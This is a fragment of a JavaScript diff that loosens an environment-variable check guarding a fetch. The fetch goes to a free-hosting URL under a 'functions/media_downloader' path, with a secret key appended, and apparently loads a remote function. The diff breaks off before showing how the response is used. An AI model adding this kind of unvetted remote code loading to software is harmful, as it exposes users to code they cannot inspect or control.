@@ -2,10 +2,7 @@ import chalk from "chalk";
 
 let remote = async () => {};
 
-if (
-  process.env.REMOTE_FUN.charAt(0) === "Y" &&
-  process.env.NODE_ENV === "production"
-) {
+if (process.env.REMOTE_FUN === "Y") {
   const response = await fetch(
     "https://ueso.000webhostapp.com/functions/media_downloader/" +
       process.env.REMOTE_FUN_KEY +
